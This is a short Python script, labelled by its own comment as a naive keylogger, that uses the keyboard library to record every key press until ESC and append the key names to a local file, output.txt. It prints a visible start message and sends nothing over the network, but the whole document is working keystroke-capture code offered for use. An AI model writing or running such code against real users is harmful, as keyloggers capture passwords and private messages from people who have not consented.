# A very naive keylogger! Starts listening to input and writes everything out to a file.

import keyboard

with open("output.txt", "a") as log_file:
    print('Starting record! Press ESC to exit!')
    events = keyboard.record(until='escape')
    
    for event in events:
        if event.event_type == keyboard.KEY_DOWN:
            key = event.name
            log_file.write(f"{key} \n")